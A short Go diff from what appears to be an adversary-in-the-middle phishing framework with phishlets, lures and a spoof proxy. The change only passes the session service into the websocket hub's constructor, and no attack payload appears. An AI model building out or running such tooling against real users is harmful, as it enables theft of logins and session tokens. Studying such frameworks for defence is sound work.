@@ -224,7 +224,7 @@ func (ini *initializer) initServices() error {
 	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
 	ini.spoofProxy = proxy.NewSpoofProxy(ini.cfg.SpoofURL, ini.logger)
-	ini.wsHub = proxy.NewWSHub(ini.bus, ini.logger)
+	ini.wsHub = proxy.NewWSHub(ini.bus, ini.sessionSvc, ini.logger)
 
 	phishletSvc := aitm.NewPhishletService(ini.phishletStore, ini.bus, ini.dnsService, ini.lureStore)
 	ini.loadPhishlets(ini.cfg.PhishletsDir, phishletSvc)
